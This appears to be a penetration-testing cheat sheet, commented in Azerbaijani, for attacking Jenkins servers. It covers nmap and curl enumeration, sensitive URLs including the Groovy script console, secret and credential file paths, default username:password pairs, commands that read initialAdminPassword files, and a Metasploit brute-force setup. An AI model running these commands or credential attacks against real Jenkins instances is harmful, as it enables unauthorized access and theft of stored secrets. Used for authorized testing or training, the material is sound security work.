# Enumeration
```powershell
# Nmap scan
nmap -sV -p 8080,8443,50000 target.com

# Script ilə
nmap -sV --script=http-title,http-auth-info -p 8080 target.com
```

# Version 
```powershell
# HTTP header
curl -s -I https://target.com:8080 | grep -i "x-jenkins\|server"
# X-Jenkins: 2.387.3
# X-Hudson: 1.395

# Ana səhifədən
curl -s https://target.com:8080 | grep -i "jenkins\|version"

# /login səhifəsi
curl -s https://target.com:8080/login | grep -i "ver\|jenkins"

# robots.txt
curl -s https://target.com:8080/robots.txt

# /oops səhifəsi
curl -s https://target.com:8080/oops | grep -i jenkins

# API ilə
curl -s https://target.com:8080/api/json | python3 -m json.tool
```

# Main Paths
```powershell
# Əsas panellər
https://target.com:8080/                        # Ana səhifə
https://target.com:8080/login                   # Login
https://target.com:8080/logout                  # Logout
https://target.com:8080/script                  # Groovy Script Console ← KRİTİK
https://target.com:8080/manage                  # İdarəetmə paneli
https://target.com:8080/systemInfo              # Sistem məlumatı
https://target.com:8080/credentials/            # Credentials
https://target.com:8080/asynchPeople/           # İstifadəçi siyahısı
https://target.com:8080/securityRealm/          # Security konfiqurasiyası

# API endpointlər
https://target.com:8080/api/json                # JSON API
https://target.com:8080/api/xml                 # XML API
https://target.com:8080/computer/api/json       # Agent məlumatları
https://target.com:8080/view/all/api/json       # View siyahısı

# Həssas fayllar (server tərəfindən)
~/.jenkins/config.xml
~/.jenkins/credentials.xml
~/.jenkins/secrets/master.key
~/.jenkins/secrets/hudson.util.Secret
~/.jenkins/users/
~/.jenkins/jobs/
```

# Default Credentials
```powershell
# Ən çox rast gəlinən
admin:admin
admin:password
admin:jenkins
jenkins:jenkins
admin:
root:root
guest:guest

# Quraşdırma zamanı yaradılan şifrə (server-də axtarılır)
cat /var/jenkins_home/secrets/initialAdminPassword
cat /var/lib/jenkins/secrets/initialAdminPassword
sudo cat /var/jenkins_home/secrets/initialAdminPassword

# Docker konteynerindən
docker exec <container_id> cat /var/jenkins_home/secrets/initialAdminPassword
```

# Brute Force
```powershell
use auxiliary/scanner/http/jenkins_login
set RHOSTS target.com
set RPORT 8080
set USERNAME admin
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```
